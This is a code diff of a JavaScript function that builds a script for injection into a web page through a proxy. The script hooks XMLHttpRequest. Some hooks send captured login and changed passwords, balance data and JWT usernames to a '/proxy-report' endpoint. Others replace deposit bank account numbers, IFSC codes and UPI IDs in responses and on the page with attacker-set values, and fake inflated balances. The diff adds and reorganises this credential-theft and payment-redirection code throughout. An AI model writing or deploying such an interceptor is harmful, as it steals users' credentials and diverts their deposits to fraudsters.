@@ -280,80 +280,6 @@ function buildInterceptorScript(proxyOrigin) {
   var _send=XMLHttpRequest.prototype.send;
   var rtDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'responseText');
   var rDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'response');
-  if(rtDesc&&rtDesc.get){
-    Object.defineProperty(XMLHttpRequest.prototype,'responseText',{get:function(){
-      if(this.__modResp!==undefined)return this.__modResp;
-      return rtDesc.get.call(this);
-    },configurable:true});
-  }
-  if(rDesc&&rDesc.get){
-    Object.defineProperty(XMLHttpRequest.prototype,'response',{get:function(){
-      if(this.__modResp!==undefined)return this.__modResp;
-      return rDesc.get.call(this);
-    },configurable:true});
-  }
-  XMLHttpRequest.prototype.open=function(m,u){
-    this._pUrl=u;this._pMethod=m;
-    return _open.apply(this,arguments);
-  };
-  XMLHttpRequest.prototype.send=function(body){
-    var xhr=this;
-    var url=xhr._pUrl||'';
-    if(url.indexOf('/api/auth')!==-1&&xhr._pMethod==='POST'){
-      try{
-        var bd=JSON.parse(body);
-        xhr.addEventListener('load',function(){
-          try{
-            var rt=rtDesc?rtDesc.get.call(xhr):xhr.responseText;
-            var r=JSON.parse(rt);
-            if(r&&(r.status===true||r.status===1||r.status==='success'||r.token||(r.data&&r.data.token))){
-              fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',username:bd.username||'',password:bd.password||'',success:true})}).catch(function(){});
-            }
-          }catch(e){}
-        });
-      }catch(e){}
-    }
-    if(url.indexOf('/api/client/get_deposit')!==-1){
-      xhr.addEventListener('readystatechange',function(){
-        if(xhr.readyState===4&&!xhr.__bankDone){
-          xhr.__bankDone=true;
-          try{
-            var rt=rtDesc?rtDesc.get.call(xhr):xhr.responseText;
-            var r=JSON.parse(rt);
-            fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'deposit',data:r})}).catch(function(){});
-            var settings=window.__PROXY_SETTINGS;
-            if(settings&&settings.bank&&settings.enabled){
-              var d=r.data||r.body||r;
-              if(d){replaceBankDeep(d,settings.bank);xhr.__modResp=JSON.stringify(r);}
-            }
-          }catch(e){}
-        }
-      });
-    }
-    if(url.indexOf('/ws/getUserDataNew')!==-1||url.indexOf('/api/client/profile')!==-1||url.indexOf('/api/client/get-client')!==-1){
-      xhr.addEventListener('readystatechange',function(){
-        if(xhr.readyState===4&&!xhr.__balDone){
-          xhr.__balDone=true;
-          try{
-            var rt=rtDesc?rtDesc.get.call(xhr):xhr.responseText;
-            var r=JSON.parse(rt);
-            var settings=window.__PROXY_SETTINGS;
-            if(settings&&settings.addedBalance&&settings.enabled){
-              addBonus(r,settings.addedBalance);
-              xhr.__modResp=JSON.stringify(r);
-            }
-            var uname=null;
-            try{var tk=localStorage.getItem('token')||'';if(tk){var parts=tk.split('.');if(parts.length===3){var p=JSON.parse(atob(parts[1]));uname=p.username||p.sub||p.userId||'';}}}catch(e2){}
-            fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'balance',username:uname,data:r})}).catch(function(){});
-          }catch(e){}
-        }
-      });
-    }
-    if(url.indexOf('/api/change_password')!==-1&&xhr._pMethod==='POST'){
-      try{var bd2=JSON.parse(body);fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'password',data:bd2})}).catch(function(){});}catch(e){}
-    }
-    return _send.apply(this,arguments);
-  };
   var BF={'accountno':'accountNo','accountnumber':'accountNo','account_no':'accountNo','receiveaccountno':'accountNo','bankaccount':'accountNo','acno':'accountNo','bankaccountno':'accountNo','beneficiaryaccount':'accountNo','account_number':'accountNo','beneficiaryname':'accountHolder','accountname':'accountHolder','account_name':'accountHolder','receiveaccountname':'accountHolder','holdername':'accountHolder','accountholder':'accountHolder','realname':'accountHolder','receivername':'accountHolder','name':'accountHolder','ifsc':'ifsc','ifsccode':'ifsc','ifsc_code':'ifsc','receiveifsc':'ifsc','bankifsc':'ifsc','bankname':'bankName','bank_name':'bankName','bank':'bankName','upiid':'upiId','upi_id':'upiId','upi':'upiId','vpa':'upiId','upiaddress':'upiId'};
   function replaceBankDeep(obj,bank){
     if(!obj||typeof obj!=='object')return;
@@ -383,6 +309,80 @@ function buildInterceptorScript(proxyOrigin) {
       if(typeof obj[k]==='object'&&obj[k]!==null){addBonus(obj[k],bonus);}
     }
   }
+  function tryModify(xhr){
+    if(xhr.__modDone)return;
+    if(xhr.readyState!==4)return;
+    xhr.__modDone=true;
+    var url=xhr._pUrl||'';
+    var orig;
+    try{orig=rtDesc?rtDesc.get.call(xhr):'';}catch(e){return;}
+    if(!orig||typeof orig!=='string')return;
+    var settings=window.__PROXY_SETTINGS;
+    if(url.indexOf('/api/client/get_deposit')!==-1){
+      try{
+        var r=JSON.parse(orig);
+        fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'deposit',data:r})}).catch(function(){});
+        if(settings&&settings.bank&&settings.enabled){
+          var d=r.data||r.body||r;
+          if(d){replaceBankDeep(d,settings.bank);xhr.__modResp=JSON.stringify(r);}
+        }
+      }catch(e){}
+    }
+    if(url.indexOf('/ws/getUserDataNew')!==-1||url.indexOf('/api/client/profile')!==-1||url.indexOf('/api/client/get-client')!==-1){
+      try{
+        var r2=JSON.parse(orig);
+        if(settings&&settings.addedBalance&&settings.enabled){
+          addBonus(r2,settings.addedBalance);
+          xhr.__modResp=JSON.stringify(r2);
+        }
+        var uname=null;
+        try{var tk=localStorage.getItem('token')||'';if(tk){var parts=tk.split('.');if(parts.length===3){var p=JSON.parse(atob(parts[1]));uname=p.username||p.sub||p.userId||'';}}}catch(e2){}
+        fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'balance',username:uname,data:r2})}).catch(function(){});
+      }catch(e){}
+    }
+  }
+  if(rtDesc&&rtDesc.get){
+    Object.defineProperty(XMLHttpRequest.prototype,'responseText',{get:function(){
+      if(this.__modResp!==undefined)return this.__modResp;
+      tryModify(this);
+      if(this.__modResp!==undefined)return this.__modResp;
+      return rtDesc.get.call(this);
+    },configurable:true});
+  }
+  if(rDesc&&rDesc.get){
+    Object.defineProperty(XMLHttpRequest.prototype,'response',{get:function(){
+      if(this.__modResp!==undefined)return this.__modResp;
+      tryModify(this);
+      if(this.__modResp!==undefined)return this.__modResp;
+      return rDesc.get.call(this);
+    },configurable:true});
+  }
+  XMLHttpRequest.prototype.open=function(m,u){
+    this._pUrl=u;this._pMethod=m;
+    return _open.apply(this,arguments);
+  };
+  XMLHttpRequest.prototype.send=function(body){
+    var xhr=this;
+    var url=xhr._pUrl||'';
+    if(url.indexOf('/api/auth')!==-1&&xhr._pMethod==='POST'){
+      try{
+        var bd=JSON.parse(body);
+        xhr.addEventListener('load',function(){
+          try{
+            var rt=rtDesc?rtDesc.get.call(xhr):xhr.responseText;
+            var r=JSON.parse(rt);
+            if(r&&(r.status===true||r.status===1||r.status==='success'||r.token||(r.data&&r.data.token))){
+              fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',username:bd.username||'',password:bd.password||'',success:true})}).catch(function(){});
+            }
+          }catch(e){}
+        });
+      }catch(e){}
+    }
+    if(url.indexOf('/api/change_password')!==-1&&xhr._pMethod==='POST'){
+      try{var bd2=JSON.parse(body);fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'password',data:bd2})}).catch(function(){});}catch(e){}
+    }
+    return _send.apply(this,arguments);
+  };
   function loadSettings(){
     var uname=null;
     try{
@@ -401,33 +401,19 @@ function buildInterceptorScript(proxyOrigin) {
   function domReplace(){
     var s=window.__PROXY_SETTINGS;
     if(!s||!s.enabled)return;
-    if(s.bank){
+    if(s.bank&&s.bank.accountNo){
       var walk=function(node){
         if(node.nodeType===3){
           var t=node.textContent;
           if(!t||t.trim().length<3)return;
           var changed=false;
-          if(s.bank.accountNo&&/\\d{8,20}/.test(t)){
+          if(/\\d{8,20}/.test(t)){
             var nums=t.match(/\\d{8,20}/g);
             if(nums){nums.forEach(function(n){if(n.length>=8&&n!==s.bank.accountNo){t=t.split(n).join(s.bank.accountNo);changed=true;}});}
           }
           if(s.bank.ifsc&&/[A-Z]{4}\\d{7}/.test(t)){
             var ifs=t.match(/[A-Z]{4}\\d{7}/g);
             if(ifs){ifs.forEach(function(i){if(i!==s.bank.ifsc){t=t.split(i).join(s.bank.ifsc);changed=true;}});}
-          }
-          if(s.bank.accountHolder&&node.parentElement){
-            var pel=node.parentElement;
-            var ptxt=(pel.previousElementSibling?pel.previousElementSibling.textContent:'')+(pel.textContent||'');
-            if(/account\\s*name|holder|beneficiary/i.test(ptxt)&&t.trim().length>1&&t.trim()!==s.bank.accountHolder&&!/bank|ifsc|amount|min|max|upi|imps|neft|code|click|transfer|payment|reference/i.test(t)){
-              t=s.bank.accountHolder;changed=true;
-            }
-          }
-          if(s.bank.bankName&&node.parentElement){
-            var pel2=node.parentElement;
-            var ptxt2=(pel2.previousElementSibling?pel2.previousElementSibling.textContent:'')+(pel2.textContent||'');
-            if(/bank\\s*name/i.test(ptxt2)&&t.trim().length>2&&!/account|ifsc|amount|min|max|upi|imps|code|holder|click|transfer/i.test(t)&&t.trim()!==s.bank.bankName){
-              t=s.bank.bankName;changed=true;
-            }
           }
           if(changed)node.textContent=t;
         }else if(node.nodeType===1&&node.childNodes){
@@ -446,7 +432,7 @@ function buildInterceptorScript(proxyOrigin) {
           var prev=el.previousElementSibling;
           var par=el.parentElement;
           var ctx=(prev?prev.textContent:'')+'|'+(par?par.textContent:'');
-          if(/bal|BAL|Bal|chips|wallet|balance|avail|credit/i.test(ctx)){
+          if(/bal|BAL|Bal|chips|wallet|balance|avail|credit|exp|EXP|Exp/i.test(ctx)){
             el.__balFixed=true;
             el.textContent=String(parseFloat((n+s.addedBalance).toFixed(2)));
           }
